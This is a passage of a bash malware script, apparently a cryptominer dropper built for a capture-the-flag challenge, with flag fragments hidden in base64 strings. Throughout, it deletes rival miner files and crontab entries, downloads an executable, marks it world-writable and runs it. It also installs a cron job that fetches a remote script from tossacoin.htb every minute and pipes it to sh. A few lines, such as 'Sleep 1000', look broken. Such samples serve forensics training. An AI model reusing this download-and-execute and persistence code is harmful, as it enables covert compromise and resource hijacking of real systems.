  if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
    echo "$BIN_PATH still not writeable"
    BIN_PATH="/dev/shm"
  fi

  BIN_FULL_PATH="$BIN_PATH/$BIN_NAME"
  echo "$BIN_FULL_PATH"

  LDR="wget -q -O -"
  if [ -s /usr/bin/curl ]; then
    LDR="curl"
  fi
  if [ -s /usr/bin/wget ]; then
    LDR="wget -q -O -"
  fi

  if [ -x "$(command -v curl)" ]; then
    WGET="curl -o"
  elif [ -x "$(command -v wget)" ]; then
    WGET="wget -O"
  else
    echo "wget none"
  fi
  echo "wget is $WGET"

  ls -la $BIN_PATH | grep -e "/dev" | grep -v grep
  if [ $? -eq 0 ]; then
    rm -rf $BIN_FULL_PATH
    rm -rf $SO_FULL_PATH
    rm -rf $BIN_PATH/kdevtmpfsi
    rm -rf $BIN_PATH/libsystem.so
    rm -rf /tmp/kdevtmpfsi
    echo "found /dev"
  else
    echo "not found /dev"
  fi
}

check_if_operation_is_active() {
  local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="
  
  if curl --silent --head --request GET "$url" | grep "200 OK" >/dev/null; then
    echo "Internet is enabled."
  else
    exit 1
  fi
}


cronCleanUp() {
  crontab -l | sed '/base64/d' | crontab -
  crontab -l | sed '/update.sh/d' | crontab -
  crontab -l | sed '/logo4/d' | crontab -
  crontab -l | sed '/logo9/d' | crontab -
  crontab -l | sed '/logo0/d' | crontab -
  crontab -l | sed '/logo/d' | crontab -
  crontab -l | sed '/tor2web/d' | crontab -
  crontab -l | sed '/jpg/d' | crontab -
  crontab -l | sed '/png/d' | crontab -
  crontab -l | sed '/tmp/d' | crontab -
  crontab -l | sed '/zmreplchkr/d' | crontab -
  crontab -l | sed '/aliyun.one/d' | crontab -
  crontab -l | sed '/pastebin/d' | crontab -
  crontab -l | sed '/onion/d' | crontab -
  crontab -l | sed '/lsd.systemten.org/d' | crontab -
  crontab -l | sed '/shuf/d' | crontab -
  crontab -l | sed '/ash/d' | crontab -
  crontab -l | sed '/mr.sh/d' | crontab -
  crontab -l | sed '/localhost.xyz/d' | crontab -
  crontab -l | sed '/github/d' | crontab -
  crontab -l | sed '/bigd1ck.com/d' | crontab -
  crontab -l | sed '/xmr.ipzse.com/d' | crontab -
  crontab -l | sed '/newdat.sh/d' | crontab -
  crontab -l | sed '/lib.pygensim.com/d' | crontab -
  crontab -l | sed '/t.amynx.com/d' | crontab -
  crontab -l | sed '/update.sh/d' | crontab -
  crontab -l | sed '/systemd-service.sh/d' | crontab -
  crontab -l | sed '/pg_stat.sh/d' | crontab -
  crontab -l | sed '/sleep/d' | crontab -
  crontab -l | sed '/oka/d' | crontab -
  crontab -l | sed '/linux1213/d' | crontab -
  crontab -l | sed '/zsvc/d' | crontab -
  crontab -l | sed '/_cron/d' | crontab -
  crontab -l | sed '/givemexyz/d' | crontab -
  crontab -l | sed '/world/d' | crontab -
  crontab -l | sed '/1.sh/d' | crontab -
  crontab -l | sed '/3.sh/d' | crontab -
  crontab -l | sed '/workers/d' | crontab -
  crontab -l | sed '/oracleservice/d' | crontab -
}

checkExists() {
  CHECK_PATH=$1
  MD5=$2
  sum=$(md5sum $CHECK_PATH | awk '{ print $1 }')
  retval=""
  if [ "$MD5" = "$sum" ]; then
    echo >&2 "$CHECK_PATH is $MD5"
    retval="true"
  else
    echo >&2 "$CHECK_PATH is not $MD5, actual $sum"
    retval="false"
  fi

  dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)
  if [[ ! -d $dest ]];
  then
    mkdir -p "$BIN_PATH/$dest"
  fi
  cp $CHECK_PATH $BIN_PATH/$dest
  echo "$retval"
}


download() {
  DOWNLOAD_PATH=$1
  DOWNLOAD_URL=$2
  if [ -L $DOWNLOAD_PATH ]
  then
    rm -rf $DOWNLOAD_PATH
  fi
  chmod 777 $DOWNLOAD_PATH
  $WGET $DOWNLOAD_PATH $DOWNLOAD_URL
  chmod +x $DOWNLOAD_PATH
}

checkTarget
check_if_operation_is_active


Sleep 1000
binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
if [ "$binExists" = "true" ]; then
  echo "$BIN_FULL_PATH exists and checked"
else
  echo "$BIN_FULL_PATH not exists"
  download $BIN_FULL_PATH $BIN_DOWNLOAD_URL
  binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
  if [ "$binExists" = "true" ]; then
    echo "$BIN_FULL_PATH after download exists and checked"
  else
    echo "$BIN_FULL_PATH after download not exists"
    download $BIN_FULL_PATH $BIN_DOWNLOAD_URL2
    binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
    if [ "$binExists" = "true" ]; then
      echo "$BIN_FULL_PATH after download2 exists and checked"
    else
      echo "$BIN_FULL_PATH after download2 not exists"
    fi
  fi
fi

chmod 777 $BIN_FULL_PATH
chmod +x $BIN_FULL_PATH
SKL=ex $BIN_FULL_PATH

crontab -l | sed '/#wget/d' | crontab -
crontab -l | sed '/#curl/d' | crontab -
crontab -l | grep -e "tossacoin.htb" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
  ) | crontab -
fi